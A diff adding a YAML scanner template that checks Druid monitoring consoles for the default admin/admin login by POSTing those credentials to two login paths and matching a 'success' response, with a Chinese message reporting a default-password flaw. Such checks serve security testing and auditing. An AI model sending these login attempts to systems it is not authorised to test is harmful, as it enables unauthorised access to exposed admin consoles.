@@ -1,0 +1,28 @@
+id:
+name: Druid-Default-Login
+tags:
+  - Apache Druid
+transport: http
+rules:
+  r0:
+    request:
+      cache: false
+      method: POST
+      path: /druid/submitLogin
+      body: |
+        {loginUsername=admin&loginPassword=admin}
+    expression: response.status==200 && '^success$'.bmatches(response.body)
+  r1:
+    request:
+      cache: false
+      method: POST
+      path: /submitLogin
+      body: |
+        {loginUsername=admin&loginPassword=admin}
+    expression: response.status==200 && '^success$'.bmatches(response.body)
+
+expression: r0() || r1()
+detail:
+  vulnerability:
+    proof:
+      info: "存在Druid-Default-Login 默认口令漏洞"
